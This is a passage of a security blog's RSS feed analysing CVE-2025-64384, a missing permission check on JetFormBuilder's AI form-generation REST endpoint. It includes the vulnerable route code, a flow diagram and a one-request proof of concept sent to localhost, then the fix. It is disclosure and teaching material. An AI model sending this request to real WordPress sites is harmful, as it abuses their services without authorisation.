class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_rest_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$endpoint_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_override&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;_doing_it_wrong&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__METHOD__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Error&amp;ensp;on&amp;ensp;register&amp;ensp;REST&amp;ensp;API&amp;ensp;route:&amp;ensp;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$route&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_rest_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1.4.0&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;register_routes&lt;/code&gt; function iterates through each route and calls &lt;code&gt;register_rest_route&lt;/code&gt; to register the API. &lt;code&gt;$this-&amp;gt;routes()&lt;/code&gt; contains the routes registered in two ways:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;By extending &lt;code&gt;Rest_Api_Controller_Base&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Controller&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Rest_Api_Controller_Base&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$routes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;routes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Get_Form_Fields&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Install_Migrations_Endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;routes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;By calling:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$rest_api&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_controller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;install&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Generate_Form_Endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Attacker&amp;ensp;(Unauthenticated&amp;ensp;user)&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Send&amp;ensp;POST&amp;ensp;request&amp;ensp;to&amp;ensp;/wp-json/jet-form-builder/v1/ai/generate&#34;]&#xD;&#xA;--&gt;&amp;ensp;C[&#34;WordPress&amp;ensp;REST&amp;ensp;API&amp;ensp;receives&amp;ensp;request&#34;]&#xD;&#xA;--&gt;&amp;ensp;D[&#34;JetFormBuilder&amp;ensp;register_routes()&amp;ensp;is&amp;ensp;triggered&amp;ensp;via&amp;ensp;rest_api_init&#34;]&#xD;&#xA;--&gt;&amp;ensp;E[&#34;Generate_Form_Endpoint&amp;ensp;registered&amp;ensp;with:&amp;ensp;methods:&amp;ensp;POST&amp;ensp;callback:&amp;ensp;run_callback&amp;ensp;permission_callback:&amp;ensp;true&amp;ensp;(default)&#34;]&#xD;&#xA;--&gt;&amp;ensp;F{&#34;Is&amp;ensp;permission_callback&amp;ensp;properly&amp;ensp;defined?&#34;}&#xD;&#xA;F&amp;ensp;--&amp;ensp;No&amp;ensp;(&lt;=3.5.3)&amp;ensp;--&gt;&amp;ensp;G[&#34;Access&amp;ensp;granted&amp;ensp;to&amp;ensp;all&amp;ensp;users&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;run_callback&amp;ensp;executed&amp;ensp;→&amp;ensp;AI&amp;ensp;form&amp;ensp;generation&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I[&#34;Attacker&amp;ensp;bypasses&amp;ensp;intended&amp;ensp;restriction&amp;ensp;(15&amp;ensp;requests/month)&#34;]&#xD;&#xA;F&amp;ensp;--&amp;ensp;Yes&amp;ensp;(&gt;=3.5.4)&amp;ensp;--&gt;&amp;ensp;J[&#34;check_permission()&amp;ensp;requires&amp;ensp;current_user_can(&#39;edit_jet_fb_forms&#39;)&#34;]&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;K[&#34;Only&amp;ensp;Admin&amp;ensp;can&amp;ensp;access&amp;ensp;→&amp;ensp;Exploit&amp;ensp;prevented&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request as an unauthenticated user:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-json/jet-form-builder/v1/ai/generate&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;prompt=create&amp;ensp;malicious&amp;ensp;form&amp;ensp;submit&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/resp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1492&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64384 stems from the &lt;strong&gt;missing &lt;code&gt;permission_callback&lt;/code&gt;&lt;/strong&gt; for the &lt;code&gt;/ai/generate&lt;/code&gt; REST API in JetFormBuilder &amp;lt;= 3.5.3, allowing &lt;strong&gt;unauthenticated users&lt;/strong&gt; to access the endpoint and abuse the AI-powered form generation feature. Version 3.5.4 fixed this by enforcing a permission check using &lt;code&gt;current_user_can(&#39;edit_jet_fb_forms&#39;)&lt;/code&gt;, restricting access to administrators only and fully eliminating the exploit possibility.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always define a &lt;code&gt;permission_callback&lt;/code&gt; when registering REST API routes.&lt;/li&gt;&#xA;&lt;li&gt;Never rely on logical limits without proper access control.&lt;/li&gt;&#xA;&lt;li&gt;Inheriting the correct base class can prevent serious security flaws.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/jetformbuilder/vulnerability/wordpress-jetformbuilder-plugin-3-5-3-broken-access-control-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin &amp;lt;= 3.5.3 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12887 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-08-cve-2025-12887/</link>
      <pubDate>Mon, 08 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-08-cve-2025-12887/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
